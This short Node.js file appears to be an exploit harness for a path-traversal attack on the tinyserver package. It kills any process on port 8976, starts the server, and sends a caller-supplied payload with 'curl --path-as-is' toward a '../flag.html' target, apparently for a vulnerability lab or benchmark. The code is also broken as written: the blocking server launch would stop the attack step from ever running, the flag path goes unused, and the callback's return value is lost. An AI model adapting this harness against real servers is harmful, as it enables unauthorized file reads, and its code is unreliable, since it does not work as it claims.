const path = require("path");

function exploitFunction(payload) {
    const { execSync } = require("child_process");
    const sleep = require("sleep");
    const pathToFlag = path.resolve(__dirname, "../flag.html");

    // Kill any existing server on port 8976
    try {
        execSync("fuser -k 8976/tcp");
    } catch (e) {}

    // Start the tinyserver
    const server = "node ./node_modules/tinyserver/lib/main.js 8976";
    execSync(server);

    // Wait for the server to start
    sleep.sleep(2);

    // Generate the attack string with the payload
    const attack_string = `curl -v --path-as-is "http://127.0.0.1:8976${payload}"`;

    // Execute the attack string
    const { exec } = require("child_process");
    exec(attack_string, (error, stdout) => {
        if (error) {
            console.error(`Error: ${error}`);
            return;
        }
        return stdout;
    });
}

module.exports = { exploitFunction };